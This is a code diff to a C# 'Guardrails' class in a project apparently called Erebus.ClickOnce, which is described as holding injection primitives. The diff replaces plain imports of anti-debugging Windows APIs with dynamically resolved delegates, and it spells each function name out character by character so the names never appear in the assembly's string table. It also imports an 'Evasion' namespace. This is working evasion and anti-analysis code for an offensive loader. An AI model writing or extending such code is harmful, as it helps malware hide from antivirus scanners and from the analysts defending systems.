@@ -7,6 +7,7 @@ using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Runtime.Versioning;
 using System.Collections.Generic;
+using Erebus.ClickOnce.Evasion;
 
 namespace Erebus.ClickOnce
 {
@@ -14,36 +15,75 @@ namespace Erebus.ClickOnce
     public static class Guardrails
     {
         // ===============================================================
-        // Native API P/Invokes (kept private to Guardrails to keep Win32.cs
-        // focused on injection primitives).
+        // D/Invoke-resolved native API wrappers. Delegate types are
+        // defined inline; each call target is resolved lazily via
+        // DynamicApi so the DLL and function names never appear in the
+        // assembly's #Strings heap as plaintext. Call sites invoke the
+        // property, which returns the cached delegate.
         // ===============================================================
 
-        [DllImport("kernel32.dll", SetLastError = true)]
+        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
         [return: MarshalAs(UnmanagedType.Bool)]
-        private static extern bool IsDebuggerPresent();
+        private delegate bool FnIdp();
 
-        [DllImport("kernel32.dll", SetLastError = true)]
+        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
         [return: MarshalAs(UnmanagedType.Bool)]
-        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
+        private delegate bool FnCrdp(IntPtr hProcess, ref bool isDebuggerPresent);
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern IntPtr GetCurrentProcess();
+        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
+        private delegate IntPtr FnGcp();
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern IntPtr GetCurrentThread();
+        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
+        private delegate IntPtr FnGct();
 
-        [DllImport("kernel32.dll", SetLastError = true)]
+        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
         [return: MarshalAs(UnmanagedType.Bool)]
-        private static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);
+        private delegate bool FnGtc(IntPtr hThread, ref CONTEXT64 lpContext);
 
-        // ProcessDebugPort = 7  (returns non-zero if a debugger is attached)
-        [DllImport("ntdll.dll")]
-        private static extern int NtQueryInformationProcess(
+        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
+        private delegate int FnQip(
             IntPtr processHandle,
             int processInformationClass,
             ref IntPtr processInformation,
             uint processInformationLength,
             IntPtr returnLength);
+
+        private static readonly Lazy<FnIdp> _isDbg =
+            DynamicApi.LazyDelegate<FnIdp>(
+                DynamicApi.Kernel32,
+                new[] { 'I', 's', 'D', 'e', 'b', 'u', 'g', 'g', 'e', 'r', 'P', 'r', 'e', 's', 'e', 'n', 't' });
+
+        private static readonly Lazy<FnCrdp> _chkRemote =
+            DynamicApi.LazyDelegate<FnCrdp>(
+                DynamicApi.Kernel32,
+                new[] { 'C', 'h', 'e', 'c', 'k', 'R', 'e', 'm', 'o', 't', 'e', 'D', 'e', 'b', 'u', 'g', 'g', 'e', 'r', 'P', 'r', 'e', 's', 'e', 'n', 't' });
+
+        private static readonly Lazy<FnGcp> _getProc =
+            DynamicApi.LazyDelegate<FnGcp>(
+                DynamicApi.Kernel32,
+                new[] { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'P', 'r', 'o', 'c', 'e', 's', 's' });
+
+        private static readonly Lazy<FnGct> _getThread =
+            DynamicApi.LazyDelegate<FnGct>(
+                DynamicApi.Kernel32,
+                new[] { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'T', 'h', 'r', 'e', 'a', 'd' });
+
+        private static readonly Lazy<FnGtc> _getCtx =
+            DynamicApi.LazyDelegate<FnGtc>(
+                DynamicApi.Kernel32,
+                new[] { 'G', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't' });
+
+        private static readonly Lazy<FnQip> _ntQIP =
+            DynamicApi.LazyDelegate<FnQip>(
+                DynamicApi.Ntdll,
+                new[] { 'N', 't', 'Q', 'u', 'e', 'r', 'y', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's' });
+
+        private static FnIdp            IsDebuggerPresent          => _isDbg.Value;
+        private static FnCrdp   CheckRemoteDebuggerPresent => _chkRemote.Value;
+        private static FnGcp            GetCurrentProcess          => _getProc.Value;
+        private static FnGct             GetCurrentThread           => _getThread.Value;
+        private static FnGtc             GetThreadContext           => _getCtx.Value;
+        private static FnQip    NtQueryInformationProcess  => _ntQIP.Value;
 
         [StructLayout(LayoutKind.Sequential, Pack = 16)]
         private struct CONTEXT64
